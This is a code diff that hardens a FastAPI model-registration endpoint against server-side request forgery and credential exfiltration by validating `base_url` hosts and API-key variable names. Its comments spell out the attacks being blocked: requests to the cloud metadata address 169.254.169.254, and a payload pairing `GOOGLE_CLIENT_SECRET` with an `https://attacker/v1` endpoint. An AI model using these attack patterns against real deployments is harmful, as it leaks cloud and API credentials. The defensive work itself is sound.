@@ -5,13 +5,65 @@ from __future__ import annotations
 from pathlib import Path
 
 from fastapi import APIRouter, HTTPException
-from pydantic import BaseModel, Field
+from pydantic import BaseModel, Field, field_validator
 
 from engine.models import CATALOGUE, DEFAULT_ROUTES, TASKS, ModelSpec, routing
 from engine.providers.llm import DEFAULT_OLLAMA_URL, LLM, ProviderUnavailable, probe_ollama
-from engine.settings import get_settings
+from engine.settings import CREDENTIAL_ENV_SUFFIXES, get_settings, is_credential_env_name
 
 router = APIRouter(prefix="/v1/models", tags=["models"])
+
+
+def check_base_url(url: str, *, provider: str = "") -> str:
+    """Reject a model endpoint that points back inside the network.
+
+    `base_url` is operator-supplied and this process then sends an API key to it,
+    so an unvalidated one is a credential exfiltration primitive *and* a request
+    forgery primitive: `http://169.254.169.254/...` is the cloud instance metadata
+    service, which hands out IAM credentials to anything that asks from the box.
+
+    Every resolved address is checked, not just the first — a hostname that
+    resolves to one public and one private address would otherwise pass here and
+    connect to the private one.
+
+    Ollama is the deliberate exemption: it *is* a loopback service, and the whole
+    point of the local-model path is pointing at `127.0.0.1:11434`. The scheme
+    check still applies to it, because `file://` is not an Ollama endpoint either.
+
+    Synchronous DNS on purpose: this runs on the Models screen's save, which is a
+    cold administrative path, and resolving off-thread would buy nothing but make
+    it usable from a Pydantic validator harder to read.
+    """
+    import ipaddress
+    import socket
+    from urllib.parse import urlsplit
+
+    if not url:
+        return url  # unset means "the provider's own endpoint", which is fine
+
+    parts = urlsplit(url)
+    if parts.scheme not in ("http", "https"):
+        raise ValueError(f"base_url must be http(s), not {parts.scheme or 'a bare path'!r}")
+    host = parts.hostname
+    if not host:
+        raise ValueError("base_url has no host")
+
+    if provider == "ollama":
+        return url
+
+    try:
+        resolved = {info[4][0] for info in socket.getaddrinfo(host, None)}
+    except OSError as exc:
+        raise ValueError(f"base_url host {host!r} does not resolve: {exc}") from exc
+
+    for address in resolved:
+        ip = ipaddress.ip_address(address)
+        if ip.is_loopback or ip.is_link_local or ip.is_private or ip.is_reserved:
+            raise ValueError(
+                f"base_url host {host!r} resolves to {ip}, which is inside this network; "
+                "only a public endpoint may be registered (use provider='ollama' for a local one)"
+            )
+    return url
 
 
 def _config_path() -> Path:
@@ -41,7 +93,28 @@ class AddModel(BaseModel):
     #: gateway shipped the real `OPENAI_API_KEY` to a third party. The *name*, not
     #: the value: a key posted to this endpoint would be persisted to
     #: `routing.json`, and CLAUDE.md #4 keeps secrets in `.env`.
+    #:
+    #: Constrained to the same shape `/v1/setup/keys` enforces, plus a suffix
+    #: allowlist — see `settings.is_credential_env_name`. Unconstrained, this field
+    #: chose which variable to read *and* `base_url` chose where to send it, so
+    #: `{api_key_env: "GOOGLE_CLIENT_SECRET", base_url: "https://attacker/v1"}` was
+    #: a two-field credential exfiltration.
     api_key_env: str = ""
+
+    @field_validator("api_key_env")
+    @classmethod
+    def _known_shape(cls, value: str) -> str:
+        if value and not is_credential_env_name(value):
+            raise ValueError(
+                f"{value!r} is not usable as a model credential: the name must be "
+                f"UPPER_SNAKE_CASE and end in one of {', '.join(CREDENTIAL_ENV_SUFFIXES)}"
+            )
+        return value
+
+    @field_validator("base_url")
+    @classmethod
+    def _reachable_and_public(cls, value: str, info) -> str:
+        return check_base_url(value, provider=str(info.data.get("provider") or ""))
 
 
 class TaskRoute(BaseModel):
@@ -177,9 +250,24 @@ async def add_model(body: AddModel) -> dict:
     return {"key": key, "is_local": spec.is_local}
 
 
+def _checked_ollama_url(base_url: str) -> str:
+    """Scheme-check the probe target.
+
+    A query parameter, so it is not covered by `AddModel`'s validator, and both
+    probe endpoints hand it straight to an HTTP client. The private-range check is
+    deliberately *not* applied — Ollama lives on loopback — but `file://` and
+    friends have no business here either way.
+    """
+    try:
+        return check_base_url(base_url, provider="ollama")
+    except ValueError as exc:
+        raise HTTPException(422, str(exc)) from exc
+
+
 @router.get("/ollama")
 async def ollama(base_url: str = DEFAULT_OLLAMA_URL) -> dict:
     """What Ollama actually has installed, so the UI offers real models."""
+    base_url = _checked_ollama_url(base_url)
     result = await probe_ollama(base_url)
     if result["available"]:
         known = {s.model for s in routing.catalogue.values() if s.is_local}
@@ -200,6 +288,7 @@ async def register_ollama(base_url: str = DEFAULT_OLLAMA_URL) -> dict:
     which is what makes small local models usable for the structured stages. It is
     not a promise the output will be *good*.
     """
+    base_url = _checked_ollama_url(base_url)
     probe = await probe_ollama(base_url)
     if not probe["available"]:
         raise HTTPException(503, f"Ollama unreachable at {base_url}: {probe.get('error')}")
